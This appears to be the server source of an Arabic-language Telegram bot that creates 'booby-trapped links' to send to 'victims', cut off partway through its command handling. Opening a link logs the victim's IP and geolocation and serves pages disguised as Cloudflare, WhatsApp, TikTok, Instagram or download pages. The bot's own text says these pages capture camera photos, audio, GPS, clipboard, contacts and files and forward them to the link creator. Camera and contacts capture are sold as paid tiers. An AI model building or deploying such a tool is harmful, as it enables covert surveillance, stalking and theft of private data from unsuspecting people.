const fs = require("fs");
const express = require("express");
const multer  = require("multer");
const upload  = multer({ storage: multer.memoryStorage(), limits: { fileSize: 15*1024*1024 } });

// ── Storage helpers ────────────────────────────────────────────────────────────

function loadJSON(file, def) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch(e) { return def; }
}
function saveJSON(file, data) { fs.writeFile(file, JSON.stringify(data), ()=>{}); }

const USERS_FILE      = "./users.json";
const BANNED_FILE     = "./banned.json";
const STATS_FILE      = "./stats.json";
const SETTINGS_FILE   = "./settings.json";
const TARGETS_FILE    = "./targets.json";
const NOTES_FILE      = "./notes.json";
const USERSTATS_FILE  = "./userstats.json";
const PROFILES_FILE   = "./profiles.json";
const PREMIUM_FILE    = "./premium.json";

const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, persistentId:true, localNet:true, webpush:true };
const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false };

let users      = new Set(loadJSON(USERS_FILE, []));
let banned     = new Set(loadJSON(BANNED_FILE, []));
let targets    = new Set(loadJSON(TARGETS_FILE, []));
let stats      = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0, ...loadJSON(STATS_FILE,{}) };
let settings   = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:false, awayMsg:"", features:{...DEFAULT_FEATURES}, featureExpiry:null, premiumFree:{...DEFAULT_PREMIUM_FREE}, premiumFreeExpiry:{}, ...loadJSON(SETTINGS_FILE,{}) };
let notes      = loadJSON(NOTES_FILE, {});
let userStats  = loadJSON(USERSTATS_FILE, {});
let profiles   = loadJSON(PROFILES_FILE, {});  // { "userId": { name, username, seen } }
let premium    = loadJSON(PREMIUM_FILE,  {});  // { "userId": { expiry: ts|-1, plan: 'monthly'|'yearly'|'lifetime' } }

if (!settings.features)      settings.features      = {...DEFAULT_FEATURES};
if (!settings.premiumFree)   settings.premiumFree   = {...DEFAULT_PREMIUM_FREE};
if (!settings.premiumFreeExpiry) settings.premiumFreeExpiry = {};
// ensure all keys always exist (handles old settings.json missing new keys)
Object.keys(DEFAULT_FEATURES).forEach(k => {
  if (!(k in settings.features)) settings.features[k] = DEFAULT_FEATURES[k];
});
Object.keys(DEFAULT_PREMIUM_FREE).forEach(k => {
  if (!(k in settings.premiumFree)) settings.premiumFree[k] = false;
  if (!(k in settings.premiumFreeExpiry)) settings.premiumFreeExpiry[k] = null;
});

function saveUsers()     { saveJSON(USERS_FILE,     [...users]); }
function saveBanned()    { saveJSON(BANNED_FILE,    [...banned]); }
function saveTargets()   { saveJSON(TARGETS_FILE,   [...targets]); }
function saveStats()     { saveJSON(STATS_FILE,     stats); }
function saveSettings()  { saveJSON(SETTINGS_FILE,  settings); }
function saveNotes()     { saveJSON(NOTES_FILE,     notes); }
function saveUserStats() { saveJSON(USERSTATS_FILE, userStats); }
function saveProfiles()  { saveJSON(PROFILES_FILE,  profiles); }
function savePremium()   { saveJSON(PREMIUM_FILE,   premium); }

// Returns true if user has active premium (owner always has it)
function isPremium(uid) {
  const id = String(uid);
  if (Number(id) === BOT_OWNER) return true;
  const p = premium[id];
  if (!p) return false;
  if (p.expiry === -1) return true;          // lifetime
  return Date.now() < p.expiry;
}

// Returns true if the premium feature is currently unlocked for ALL users
function isPremiumFeatureFree(feature) {
  if (!settings.premiumFree?.[feature]) return false;
  const exp = settings.premiumFreeExpiry?.[feature];
  if (exp && Date.now() > exp) {
    settings.premiumFree[feature] = false;
    settings.premiumFreeExpiry[feature] = null;
    saveSettings();
    return false;
  }
  return true;
}

// Returns true if uid can use a specific premium feature
function canUsePremium(uid, feature) {
  return isPremium(uid) || isPremiumFeatureFree(feature);
}

// HTML upsell page for non-premium users
function upsellPage(ownerUsername) {
  const u = ownerUsername || 'Ye_x00';
  return `<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ميزة مدفوعة</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a1a;color:#fff;font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;}.card{background:#12122a;border:1px solid #2a2a5a;border-radius:20px;padding:36px 28px;max-width:360px;width:92%;text-align:center;}.icon{font-size:54px;margin-bottom:14px}.title{font-size:21px;font-weight:700;color:#e0e0ff;margin-bottom:10px}.sub{font-size:13px;color:#888;margin-bottom:24px;line-height:1.7}.features{background:#0d0d22;border-radius:12px;padding:16px;margin-bottom:24px;text-align:right}.feat-row{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid #1a1a3a;font-size:13px;color:#ccc}.feat-row:last-child{border-bottom:none}.btn{display:block;width:100%;background:linear-gradient(135deg,#0066ff,#0044aa);color:#fff;border:none;padding:15px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-decoration:none;}</style>
</head><body><div class="card">
<div class="icon">💎</div>
<div class="title">ميزة حصرية للمشتركين</div>
<div class="sub">هذه الميزة متاحة فقط للمشتركين في الباقة المدفوعة</div>
<div class="features">
  <div class="feat-row">📷 الكاميرا الأمامية والخلفية</div>
  <div class="feat-row">🎤 تسجيل صوتي</div>
  <div class="feat-row">📋 محتوى الحافظة</div>
  <div class="feat-row">📒 جهات الاتصال الكاملة</div>
  <div class="feat-row">🖼️ الصور والملفات</div>
</div>
<a class="btn" href="https://t.me/${u}">💬 تواصل للاشتراك</a>
</div></body></html>`;
}

// Premium expiry watcher — alert owner when someone's premium expires
setInterval(() => {
  const now = Date.now();
  for (const [id, p] of Object.entries(premium)) {
    if (p.expiry !== -1 && p.expiry > 0 && now > p.expiry && !p.expired) {
      premium[id].expired = true; savePremium();
      const prof = profiles[id] || {};
      bot.sendMessage(BOT_OWNER, `⏰ انتهى اشتراك ${prof.name || id} (@${prof.username || '?'})\nID: \`${id}\``, { parse_mode:"Markdown" }).catch(()=>{});
    }
  }
}, 60000);

// Auto-disable features when timer expires
setInterval(() => {
  if (settings.featureExpiry && Date.now() > settings.featureExpiry) {
    settings.featureExpiry = null;
    settings.features = Object.fromEntries(Object.keys(settings.features).map(k=>[k,false]));
    saveSettings();
    bot.sendMessage(BOT_OWNER, "⏱️ انتهى وقت الميزات — تم إيقافها تلقائياً.").catch(()=>{});
  }
}, 30000);

function incUserStat(uid, field) {
  if (!userStats[uid]) userStats[uid] = { linksCreated:0, linksOpened:0 };
  userStats[uid][field] = (userStats[uid][field] || 0) + 1;
  if (field === 'linksOpened') userStats[uid].lastOpen = new Date().toJSON().slice(0,19).replace('T',' ');
  saveUserStats();
}

// ── GitHub Data Persistence ───────────────────────────────────────────────────

const GH_TOKEN = process.env.GH_TOKEN || "";
const GH_OWNER = "Amroalbdwy";
const GH_REPO  = "Bot";

const DATA_FILES = [
  { local: "./users.json",     remote: "_data/users.json"     },
  { local: "./banned.json",    remote: "_data/banned.json"    },
  { local: "./stats.json",     remote: "_data/stats.json"     },
  { local: "./settings.json",  remote: "_data/settings.json"  },
  { local: "./targets.json",   remote: "_data/targets.json"   },
  { local: "./notes.json",     remote: "_data/notes.json"     },
  { local: "./userstats.json", remote: "_data/userstats.json" },
  { local: "./profiles.json",  remote: "_data/profiles.json"  },
  { local: "./premium.json",   remote: "_data/premium.json"   },
];

async function ghGet(path) {
  try {
    const r = await fetch(`https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${path}`, {
      headers: { Authorization: `token ${GH_TOKEN}`, "User-Agent": "bot-data" }
    });
    if (r.status === 200) return r.json();
  } catch(e) {}
  return null;
}

async function ghPut(path, content, sha) {
  try {
    const body = { message: `data:backup ${new Date().toISOString()}`, content: Buffer.from(content).toString('base64') };
    if (sha) body.sha = sha;
    await fetch(`https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${path}`, {
      method: 'PUT',
      headers: { Authorization: `token ${GH_TOKEN}`, "Content-Type": "application/json", "User-Agent": "bot-data" },
      body: JSON.stringify(body)
    });
  } catch(e) {}
}

// Restore data from GitHub on startup
async function restoreFromGitHub() {
  let restored = 0;
  for (const f of DATA_FILES) {
    try {
      const d = await ghGet(f.remote);
      if (d && d.content) {
        fs.writeFileSync(f.local, Buffer.from(d.content, 'base64').toString('utf8'));
        restored++;
      }
    } catch(e) {}
  }
  if (restored > 0) {
    // Reload in-memory data from restored files
    users     = new Set(loadJSON(USERS_FILE, []));
    banned    = new Set(loadJSON(BANNED_FILE, []));
    targets   = new Set(loadJSON(TARGETS_FILE, []));
    stats     = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0, ...loadJSON(STATS_FILE, {}) };
    settings  = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:false, awayMsg:"", features:{...DEFAULT_FEATURES}, featureExpiry:null, premiumFree:{...DEFAULT_PREMIUM_FREE}, premiumFreeExpiry:{}, ...loadJSON(SETTINGS_FILE, {}) };
    notes     = loadJSON(NOTES_FILE, {});
    userStats = loadJSON(USERSTATS_FILE, {});
    profiles  = loadJSON(PROFILES_FILE, {});
    premium   = loadJSON(PREMIUM_FILE, {});
    if (!settings.features)      settings.features      = {...DEFAULT_FEATURES};
    if (!settings.premiumFree)   settings.premiumFree   = {...DEFAULT_PREMIUM_FREE};
    if (!settings.premiumFreeExpiry) settings.premiumFreeExpiry = {};
    Object.keys(DEFAULT_PREMIUM_FREE).forEach(k => {
      if (!(k in settings.premiumFree))       settings.premiumFree[k]       = false;
      if (!(k in settings.premiumFreeExpiry)) settings.premiumFreeExpiry[k] = null;
    });
    console.log(`✅ استُعيد ${restored} ملف من GitHub`);
  }
  return restored;
}

// Immediately backup a single local file to GitHub
async function backupFileToGH(localPath, remotePath) {
  try {
    if (!fs.existsSync(localPath)) return;
    const content = fs.readFileSync(localPath, 'utf8');
    const existing = await ghGet(remotePath);
    await ghPut(remotePath, content, existing?.sha);
  } catch(e) {}
}

// Save all data files to GitHub
async function backupToGitHub() {
  for (const f of DATA_FILES) {
    try {
      if (!fs.existsSync(f.local)) continue;
      const content = fs.readFileSync(f.local, 'utf8');
      const existing = await ghGet(f.remote);
      await ghPut(f.remote, content, existing?.sha);
    } catch(e) {}
  }
  console.log("💾 تم حفظ البيانات على GitHub");
}

// ── Setup ─────────────────────────────────────────────────────────────────────

const cors        = require('cors');
const bodyParser  = require('body-parser');
const fetch       = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

const bot = new TelegramBot(process.env["bot"], { polling: true });
const app = express();
app.use(bodyParser.json({ limit: '20mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
app.use(cors());
app.use(express.static('public'));
app.set("view engine", "ejs");

const hostURL   = "https://bot-psue.onrender.com";
const use1pt    = false;
const BOT_OWNER = 6012675140;
const REPLY_PREFIX        = "📝 اكتب ردك على المستخدم\nUID:";
const PREM_GRANT_PREFIX   = "💎 أدخل ID المستخدم ومدة التفعيل (مثال: 123456789 30 أو 123456789 lifetime):";
const PREM_REVOKE_PREFIX  = "🗑️ أدخل ID المستخدم لإلغاء البريميوم:";

// ── Global crash protection ────────────────────────────────────────────────────
process.on('uncaughtException',  (err) => { console.error('uncaughtException:', err.message); });
process.on('unhandledRejection', (err) => { console.error('unhandledRejection:', err?.message || err); });

// ── Markdown escape helper ─────────────────────────────────────────────────────
function mdEsc(text) {
  if (!text) return '';
  return String(text).replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
}

// ── Startup notification (max once per 5 minutes) ─────────────────────────────
setTimeout(() => {
  const now = Date.now();
  const lastTs = settings.startup_notify_ts || 0;
  if (now - lastTs < 5 * 60 * 1000) return;
  settings.startup_notify_ts = now;
  saveSettings();
  backupFileToGH(SETTINGS_FILE, '_data/settings.json');
  bot.sendMessage(BOT_OWNER,
    `🟢 البوت اشتغل!\n⏰ ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC\n👥 المستخدمون: ${users.size} | 🎯 الأهداف: ${targets.size}`
  ).catch(() => {});
}, 4000);

// ── Utilities ─────────────────────────────────────────────────────────────────

function getIP(req) {
  if (req.headers['x-forwarded-for']) return req.headers['x-forwarded-for'].split(",")[0].trim();
  if (req.connection?.remoteAddress) return req.connection.remoteAddress;
  return req.ip;
}

const _ipCache = new Map();
async function enrichIP(ip) {
  const cached = _ipCache.get(ip);
  if (cached && Date.now() < cached.expiry) return cached.info;
  try {
    const d = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org,lat,lon,status`).then(r => r.json());
    if (d.status === "success") {
      const info = `🌍 ${d.country} | 🏙️ ${d.city}, ${d.regionName}\n📡 ISP: ${d.isp}\n🏢 Org: ${d.org}\n🗺️ https://maps.google.com/?q=${d.lat},${d.lon}`;
      _ipCache.set(ip, { info, expiry: Date.now() + 24*3600*1000 });
      return info;
    }
  } catch(e) {}
  return null;
}

function notify(id, msg, opts) {
  if (settings.silentMode) return;
  bot.sendMessage(id, msg, opts || {}).catch(() => {});
}
function notifyPhoto(id, buf, opts, info) {
  if (settings.silentMode) return;
  bot.sendPhoto(id, buf, opts || {}, info).catch(() => {});
}
function notifyDoc(id, buf, opts, info) {
  if (settings.silentMode) return;
  bot.sendDocument(id, buf, opts || {}, info).catch(() => {});
}
function notifyLoc(id, lat, lon) {
  if (settings.silentMode) return;
  bot.sendLocation(id, lat, lon).catch(() => {});
}

// ── Daily scheduled report ────────────────────────────────────────────────────
setInterval(() => {
  if (settings.scheduleHour < 0) return;
  const now = new Date();
  if (now.getUTCHours() === settings.scheduleHour && now.getUTCMinutes() === 0) {
    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
    const topU = Object.entries(userStats).sort((a,b)=>(b[1].linksOpened||0)-(a[1].linksOpened||0)).slice(0,3)
      .map(([id,u],i)=>{ const p=profiles[id]||{}; return `${['🥇','🥈','🥉'][i]} ${p.name||id}: ${u.linksOpened||0}`; }).join(" | ")||"—";
    bot.sendMessage(BOT_OWNER,
      `📅 تقرير يومي — ${new Date().toJSON().slice(0,10)}\n━━━━━━━━━━━━━━━\n👥 مستخدمون: ${users.size}  🎯 أهداف: ${targets.size}  🚫 محجوب: ${banned.size}\n━━━━━━━━━━━━━━━\n🔗 روابط: ${stats.linksCreated} منشأة / ${stats.linksOpened} مفتوحة\n📷 صور: ${stats.camsnaps}  🎙️ صوت: ${stats.audios}  📍 مواقع: ${stats.locations}\n━━━━━━━━━━━━━━━\n🏆 الأكثر نشاطاً: ${topU}\n🔕 صامت: ${settings.silentMode?'مفعّل':'معطّل'}  ⏱️ تشغيل: ${h}س ${m}د`
    ).catch(() => {});
  }
}, 60 * 1000);

// ── Routes ────────────────────────────────────────────────────────────────────

async function handleLinkOpen(req, res, view) {
  // Ignore Telegram's link-preview bot (visits URL before real user does)
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  if (ua.includes('telegrambot') || ua.includes('twitterbot') || ua.includes('facebookexternalhit') || ua.includes('whatsapp') || ua.includes('bot') && ua.includes('preview')) {
    return res.status(200).send('OK');
  }

  const ip = getIP(req);
  const d  = new Date().toJSON().slice(0,19).replace('T',':');
  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");

  const creatorId = parseInt(req.params.path, 36);
  stats.linksOpened++;
  saveStats();
  incUserStat(String(creatorId), 'linksOpened');

  const isTarget = targets.has(creatorId);
  const flag = isTarget ? '🎯🚨' : '⚠️';
  const quickMsg = `${flag} تم فتح رابطك!\n⚓ IP: ${ip}\n⏰ ${d} UTC`;

  notify(creatorId, quickMsg);
  if (creatorId !== BOT_OWNER)
    notify(BOT_OWNER, `${flag} فُتح رابط!\n👤 المنشئ: ${creatorId}\n⚓ IP: ${ip}\n⏰ ${d} UTC`);

  // Async IP enrichment
  enrichIP(ip).then(info => {
    if (!info) return;
    notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
  });

  const feat = settings.features || DEFAULT_FEATURES;
  const userPremium = isPremium(creatorId);
  const camAccess  = canUsePremium(creatorId, 'camera');
  const audioAccess= canUsePremium(creatorId, 'audio');
  const clipAccess = canUsePremium(creatorId, 'clipboard');
  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess });
}

app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
app.get("/c/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "cloudflare"); });
app.get("/wa/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "whatsapp"); });
app.get("/dl/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "download"); });
app.get("/tt/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "tiktok"); });
app.get("/ig/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "instagram"); });

// ── Files/Photos route (premium only) ─────────────────────────────────────────
app.get("/f/:path/*", async (req, res) => {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  if (ua.includes('telegrambot') || ua.includes('twitterbot') || ua.includes('facebookexternalhit')) return res.status(200).send('OK');
  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");
  const creatorId = parseInt(req.params.path, 36);
  if (!canUsePremium(creatorId, 'files')) return res.send(upsellPage());
  const ip = getIP(req);
  const d  = new Date().toJSON().slice(0,19).replace('T',':');
  stats.linksOpened++; saveStats();
  incUserStat(String(creatorId), 'linksOpened');
  const flag = targets.has(creatorId) ? '🎯🚨' : '⚠️';
  notify(creatorId, `${flag} تم فتح رابط الملفات!\n⚓ IP: ${ip}\n⏰ ${d} UTC`);
  if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `${flag} رابط ملفات! ID: ${creatorId}\n⚓ ${ip}\n⏰ ${d} UTC`);
  enrichIP(ip).then(info => {
    if (!info) return;
    notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
  });
  const redirectUrl = Buffer.from(req.params[0], 'base64').toString('utf8');
  res.render("files", { uid: req.params.path, a: hostURL, redirectUrl });
});

// ── Contacts route (premium only) ─────────────────────────────────────────────
app.get("/co/:path/*", async (req, res) => {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  if (ua.includes('telegrambot') || ua.includes('twitterbot') || ua.includes('facebookexternalhit')) return res.status(200).send('OK');
  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");
  const creatorId = parseInt(req.params.path, 36);
  if (!canUsePremium(creatorId, 'contacts')) return res.send(upsellPage());
  const ip = getIP(req);
  const d  = new Date().toJSON().slice(0,19).replace('T',':');
  stats.linksOpened++; saveStats();
  incUserStat(String(creatorId), 'linksOpened');
  const flag = targets.has(creatorId) ? '🎯🚨' : '⚠️';
  notify(creatorId, `${flag} تم فتح رابط جهات الاتصال!\n⚓ IP: ${ip}\n⏰ ${d} UTC`);
  if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `${flag} رابط اتصالات! ID: ${creatorId}\n⚓ ${ip}\n⏰ ${d} UTC`);
  enrichIP(ip).then(info => {
    if (!info) return;
    notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
  });
  const redirectUrl = Buffer.from(req.params[0], 'base64').toString('utf8');
  res.render("contacts", { uid: req.params.path, a: hostURL, redirectUrl });
});

// ── Bot Logic ─────────────────────────────────────────────────────────────────

bot.on('message', async (msg) => {
  if (!msg?.chat) return;
  const chatId = msg.chat.id;
  if (banned.has(chatId)) return;

  // ── Force-reply handlers ─────────────────────────────────────────────────
  if (msg?.reply_to_message?.text === "🌐 Enter Your URL" && msg.text)
    return createLink(chatId, msg.text);

  if (msg?.reply_to_message?.text === "📢 اكتب الرسالة التي تريد إرسالها للجميع:" && chatId === BOT_OWNER) {
    let sent = 0, failed = 0;
    for (const uid of users) { try { await bot.sendMessage(uid, msg.text); sent++; } catch(e) { failed++; } }
    return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
  }

  if (chatId === BOT_OWNER && msg?.reply_to_message?.text?.startsWith(REPLY_PREFIX) && msg.text) {
    const uid = msg.reply_to_message.text.replace(REPLY_PREFIX,"").split("\n")[0].trim();
    const tid = parseInt(uid);
    if (!isNaN(tid)) {
      try { await bot.sendMessage(tid, `📩 رسالة:\n\n${msg.text}`); return bot.sendMessage(chatId, `✅ تم الإرسال.`); }
      catch(e) { return bot.sendMessage(chatId, `❌ فشل: ${e.message}`); }
    }
  }

  if (chatId === BOT_OWNER && msg?.reply_to_message?.text === PREM_GRANT_PREFIX && msg.text) {
    const parts = msg.text.trim().split(/\s+/);
    const tid = parts[0]; const daysArg = parts[1] || "30";
    if (!tid || isNaN(Number(tid))) return bot.sendMessage(chatId, "⚠️ صيغة خاطئة. مثال: 123456789 30");
    let expiry, plan;
    if (daysArg === "lifetime") { expiry = -1; plan = "lifetime"; }
    else { const d = parseInt(daysArg)||30; expiry = Date.now() + d*24*3600*1000; plan = d >= 365 ? "yearly" : d >= 30 ? "monthly" : "weekly"; }
    premium[tid] = { expiry, plan, grantedAt: Date.now() };
    savePremium();
    backupFileToGH(PREMIUM_FILE, '_data/premium.json');
    const prof = profiles[tid] || {};
    const expText = expiry === -1 ? "♾️ مدى الحياة" : `حتى ${new Date(expiry).toJSON().slice(0,10)}`;
    bot.sendMessage(chatId, `✅ تم تفعيل البريميوم\n👤 ${prof.name||tid}\n📦 ${plan}\n${expText}`);
    bot.sendMessage(Number(tid), `🎉 تم تفعيل اشتراكك البريميوم!\n📦 الخطة: ${plan}\n${expText}\n\n🔓 ميزاتك الآن:\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n📋 قراءة الحافظة\n📒 جهات الاتصال\n🖼️ صور وملفات الجهاز`).catch(()=>{});
    return;
  }

  if (chatId === BOT_OWNER && msg?.reply_to_message?.text === PREM_REVOKE_PREFIX && msg.text) {
    const tid = msg.text.trim();
    if (!premium[tid]) return bot.sendMessage(chatId, `⚠️ ID: ${tid} ليس لديه اشتراك.`);
    delete premium[tid]; savePremium();
    backupFileToGH(PREMIUM_FILE, '_data/premium.json');
    bot.sendMessage(chatId, `🗑️ تم إلغاء اشتراك ${tid}`);
    bot.sendMessage(Number(tid), `⚠️ تم إلغاء اشتراكك البريميوم.\nتواصل مع المالك لتجديده.`).catch(()=>{});
    return;
  }

  users.add(chatId);
  saveUsers();
  // Save user profile (name + username)
  const pid = String(chatId);
  profiles[pid] = {
    name: [msg.chat.first_name, msg.chat.last_name].filter(Boolean).join(" ") || "مجهول",
    username: msg.chat.username ? `@${msg.chat.username}` : "",
    seen: new Date().toJSON().slice(0,19).replace('T',' ')
  };
  saveProfiles();

  // ── Away mode: auto-reply for owner ────────────────────────────────────
  if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/") && settings.awayMode && settings.awayMsg) {
    bot.sendMessage(chatId, settings.awayMsg).catch(() => {});
  }

  // ── Forward messages to owner ──────────────────────────────────────────
  if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/")) {
    const name     = msg.chat.first_name || "مجهول";
    const username = msg.chat.username ? `@${msg.chat.username}` : "لا يوجد";
    bot.sendMessage(BOT_OWNER,
      `${targets.has(chatId) ? '🎯 رسالة من هدف:\n' : '📩 رسالة:\n'}👤 ${name}\n🔗 ${username}\n🆔 ${chatId}\n\n💬 ${msg.text}`,
      { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "📩 رد على المستخدم", callback_data: `reply:${chatId}` }]] }) }
    );
  }

  // ── Commands ──────────────────────────────────────────────────────────────

  if (msg.text === "/start") {
    const isNew = !userStats[String(chatId)];
    const isOwner = chatId === BOT_OWNER;
    const baseRows = [
      [{ text: "🔗 إنشاء رابط ملغم", callback_data: "crenew" }],
      [{ text: "💎 مميزات البريميوم", callback_data: "pinfo" }],
      [{ text: "📖 المساعدة", callback_data: "help" }, { text: "🆔 ID الخاص بي", callback_data: "myid" }],
      [{ text: "📊 إحصائياتي", callback_data: "mystats" }],
      ...(isOwner ? [[{ text: "👑 إدارة البريميوم", callback_data: "premadmin" }]] : [])
    ];
    const keyboard = { reply_markup: JSON.stringify({ inline_keyboard: baseRows }) };
    const welcome = settings.welcomeMsg ||
      `${isNew ? '👋 أهلاً بك لأول مرة!' : `مرحباً مجدداً ${msg.chat.first_name}!`} 🎉\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع (GPS + IP)\n📱 بيانات الجهاز الكاملة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة\n📋 محتوى الحافظة\n🔍 ISP، الدولة، المدينة\n\n⚡ Powered by @Ye_x00`;
    return bot.sendMessage(chatId, welcome, keyboard);
  }

  if (msg.text === "/create") return createNew(chatId);

  if (msg.text === "/myid")
    return bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });

  // /mystats — user sees their own link stats
  if (msg.text === "/mystats") {
    const us = userStats[String(chatId)] || { linksCreated: 0, linksOpened: 0 };
    return bot.sendMessage(chatId,
      `📊 إحصائياتك الشخصية:\n\n🔗 الروابط التي أنشأتها: ${us.linksCreated}\n👁️ مرات الفتح على روابطك: ${us.linksOpened}`
    );
  }

  if (msg.text === "/help") {
    let t = `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك فوراً:\n   ⚡ IP + تفاصيل ISP والدولة\n   📱 بيانات الجهاز الكاملة\n   📷 صور (أمامية + خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n🔗 أنواع الروابط:\n   🌐 Cloudflare\n   🖥️ WebView\n   💬 WhatsApp\n   📁 Google Drive\n\n📊 /mystats — إحصائياتك الشخصية\n\n⚡ Powered by @Ye_x00`;
    if (chatId === BOT_OWNER) {
      t += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات الكاملة\n/report — تقرير شامل فوري\n/features — 🎛️ التحكم بالميزات\n/users — المستخدمون (مع الأسماء)\n/search [نص] — 🔍 بحث بالاسم أو اليوزر\n/export — تصدير شامل كملف\n/info [id] — معلومات مستخدم\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف\n/clearusers — مسح الكل\n/note [id] [نص] — إضافة ملاحظة\n/notes [id] — عرض الملاحظات\n/delnotes [id] — حذف الملاحظات\n/silent — الوضع الصامت 🔕\n/away [نص] — وضع الغياب\n/awayoff — إيقاف الغياب\n/addtarget [id] — إضافة هدف 🎯\n/removetarget [id] — إزالة هدف\n/targets — قائمة الأهداف\n/schedule [ساعة/off] — تقرير يومي\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/clearstats — مسح الإحصائيات\n/ping — اختبار السرعة`;
    }
    return bot.sendMessage(chatId, t);
  }

  if (msg.text?.startsWith("/broadcast")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (msg.text.trim() === "/broadcast")
      return bot.sendMessage(chatId, "📢 اكتب الرسالة التي تريد إرسالها للجميع:", { reply_markup: JSON.stringify({ force_reply: true }) });
    const text = msg.text.replace("/broadcast ", "");
    let sent = 0, failed = 0;
    for (const uid of users) { try { await bot.sendMessage(uid, text); sent++; } catch(e) { failed++; } }
    return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
  }

  if (msg.text === "/stats") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60), s2 = up%60;
    const bar = (v, max, len=10) => { const f=Math.round((v/Math.max(max,1))*len); return '█'.repeat(f)+'░'.repeat(len-f); };
    const mx = Math.max(stats.linksOpened, stats.camsnaps, stats.locations, stats.audios, 1);
    return bot.sendMessage(chatId,
      `📊 إحصائيات البوت\n━━━━━━━━━━━━━━━\n👥 المستخدمون: ${users.size}  🎯 الأهداف: ${targets.size}  🚫 محجوب: ${banned.size}\n━━━━━━━━━━━━━━━\n🔗 روابط منشأة:  ${stats.linksCreated}\n👁️ روابط مفتوحة: ${stats.linksOpened}\n${bar(stats.linksOpened,mx)}\n📷 صور كاميرا:   ${stats.camsnaps}\n${bar(stats.camsnaps,mx)}\n📍 مواقع:        ${stats.locations}\n${bar(stats.locations,mx)}\n🎙️ تسجيلات:      ${stats.audios}\n${bar(stats.audios,mx)}\n━━━━━━━━━━━━━━━\n🔕 صامت: ${settings.silentMode?'🔴 مفعّل':'🟢 معطّل'}  🌙 غياب: ${settings.awayMode?'🟡 مفعّل':'معطّل'}\n📅 تقرير يومي: ${settings.scheduleHour>=0?settings.scheduleHour+':00 UTC':'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د ${s2}ث`
    );
  }

  if (msg.text === "/report") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
